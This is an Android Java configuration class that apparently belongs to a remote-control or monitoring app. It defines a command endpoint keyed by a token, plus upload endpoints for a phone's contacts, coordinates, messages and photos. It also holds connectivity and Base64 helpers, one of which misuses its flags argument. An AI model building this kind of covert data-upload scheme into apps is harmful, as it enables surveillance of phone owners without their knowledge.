package com.androix;

import android.content.Context;
import android.net.ConnectivityManager;
import android.os.Environment;
import android.util.Base64;

import org.json.JSONObject;

/**
 * Created by Rafael on 03/08/15.
 */
public  class  Config {

    public static String TOKEN = "288855e1047995076511bea66264d674";

    public static String URL = "http://localhost/";

    public static String URL_ACAO = URL + "comando/" + TOKEN;

    public static String URL_PARA_ACAO = URL +  "cancela-acao";

    public static String SEND_CONTATOS = URL +  "com-contatos";

    public static String SEND_COORDENADAS = URL +  "com-coordenadas";

    public static String SEND_MENSAGENS = URL +  "com-mensagens";

    public static String SEND_FOTO = URL +  "com-foto";



    public static String encode(String str)
    {
        byte[] b = Base64.encode(str.getBytes(),str.length());

        return new String(b);
    }


    public static Boolean VerificaConexao(Context c)
    {
        try {
            ConnectivityManager cm = (ConnectivityManager)
                    c.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).isConnected()) {
                return true;
            }else if(cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI).isConnected()){
                return true;
            }else {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
    }


    public static String DIR_FOTO()
    {
        String foto = String.format("/sdcard/foto.jpg",System.currentTimeMillis());
        return foto;
    }



}
